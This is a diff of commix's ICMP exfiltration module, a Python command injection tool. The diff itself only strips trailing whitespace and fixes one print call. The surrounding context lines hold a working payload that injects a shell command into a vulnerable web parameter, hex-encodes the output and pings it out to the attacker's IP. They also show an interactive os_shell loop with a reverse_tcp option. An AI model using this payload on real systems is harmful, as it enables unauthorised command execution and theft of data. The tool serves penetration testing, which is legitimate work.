@@ -9,7 +9,7 @@ This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
- 
+
 For more see the file 'readme/COPYING' for copying permission.
 """
 
@@ -62,7 +62,7 @@ pass
 
 
 """
-The ICMP exfiltration technique: 
+The ICMP exfiltration technique:
 Exfiltrate data using the ping utility.
 
 [1] http://blog.ring-zer0.com/2014/02/data-exfiltration-on-linux.html
@@ -91,15 +91,15 @@ def snif(ip_dst, ip_src):
   info_msg += Style.RESET_ALL + Style.BRIGHT + " and " + Fore.YELLOW 
   info_msg += ip_dst + Style.RESET_ALL + Style.BRIGHT + "."
   print(settings.print_bold_info_msg(info_msg))
-  
+
   while True:
     sniff(filter = "icmp and src " + ip_dst, prn=packet_handler, timeout=settings.TIMESEC)
- 
+
 def cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src):
   global add_new_line
   # ICMP exfiltration payload.
   payload = ("; " + cmd + " | xxd -p -c" + str(exfiltration_length) + " | while read line; do ping -p $line -c1 -s" + str(exfiltration_length * 2) + " -q " + ip_src + "; done")
-  
+
   # Check if defined "--verbose" option.
   if settings.VERBOSITY_LEVEL >= 1:
     debug_msg = "Executing the '" + cmd + "' command. "
@@ -125,7 +125,7 @@ def cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src):
       add_new_line = True
     else:
       print("")
-      
+
   except _urllib.error.HTTPError as err_msg:
     print(settings.print_critical_msg(str(err_msg.code)))
     raise SystemExit()
@@ -160,11 +160,11 @@ def input_cmd(http_request_method, url, vuln_parameter, ip_src, technique):
   while True:
     if go_back == True:
       break
-    if not menu.options.batch:  
+    if not menu.options.batch:
       question_msg = "Do you want a Pseudo-Terminal shell? [Y/n] > "
       gotshell = _input(settings.print_question_msg(question_msg))
     else:
-      gotshell = ""  
+      gotshell = ""
     if len(gotshell) == 0:
        gotshell= "Y"
     if gotshell in settings.CHOICE_YES:
@@ -185,12 +185,12 @@ def input_cmd(http_request_method, url, vuln_parameter, ip_src, technique):
           cmd = _input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
           cmd = checks.escaped_cmd(cmd)
           if cmd.lower() in settings.SHELL_OPTIONS:
-            if cmd.lower() == "quit" or cmd.lower() == "back":       
-              print("")             
+            if cmd.lower() == "quit" or cmd.lower() == "back":
+              print("")
               os._exit(0)
-            elif cmd.lower() == "?": 
+            elif cmd.lower() == "?":
               menu.os_shell_options()
-            elif cmd.lower() == "os_shell": 
+            elif cmd.lower() == "os_shell":
               warn_msg = "You are already into the '" + cmd.lower() + "' mode."
               print(settings.print_warning_msg(warn_msg))+ "\n"
             elif cmd.lower() == "reverse_tcp":
@@ -246,7 +246,7 @@ def icmp_exfiltration_handler(url, http_request_method):
     request = _urllib.request.Request(url)
     headers.do_check(request)
     vuln_parameter = parameters.vuln_GET_param(url)
-    
+
   else:
     parameter = menu.options.data
     parameter = _urllib.parse.unquote(parameter)
@@ -254,17 +254,17 @@ def icmp_exfiltration_handler(url, http_request_method):
     request = _urllib.request.Request(url, parameter)
     headers.do_check(request)
     vuln_parameter = parameters.vuln_POST_param(parameter, url)
-  
+
   # Check if defined any HTTP Proxy.
   if menu.options.proxy:
     try:
       response = proxy.use_proxy(request)
     except _urllib.error.HTTPError as err_msg:
       if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR:
-        response = False  
+        response = False
       elif settings.IGNORE_ERR_MSG == False:
         err = str(err_msg) + "."
-        print("\n") + settings.print_critical_msg(err)
+        print("\n" + settings.print_critical_msg(err))
         continue_tests = checks.continue_tests(err_msg)
         if continue_tests == True:
           settings.IGNORE_ERR_MSG = True
@@ -277,7 +277,7 @@ def icmp_exfiltration_handler(url, http_request_method):
       response = tor.use_tor(request)
     except _urllib.error.HTTPError as err_msg:
       if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR:
-        response = False  
+        response = False
       elif settings.IGNORE_ERR_MSG == False:
         err = str(err_msg) + "."
         print("\n") + settings.print_critical_msg(err)
@@ -292,7 +292,7 @@ def icmp_exfiltration_handler(url, http_request_method):
       response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
     except _urllib.error.HTTPError as err_msg:
       if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR:
-        response = False  
+        response = False
       elif settings.IGNORE_ERR_MSG == False:
         err = str(err_msg) + "."
         print("\n") + settings.print_critical_msg(err)
@@ -323,7 +323,7 @@ def icmp_exfiltration_handler(url, http_request_method):
     # Destination IP address
     ip_dst =  re.findall(r"ip_dst=(.*)", ip_data)
     ip_dst = ''.join(ip_dst)
-    
+
     exploitation(ip_dst, ip_src, url, http_request_method, vuln_parameter, technique)
 
 if __name__ == "__main__":
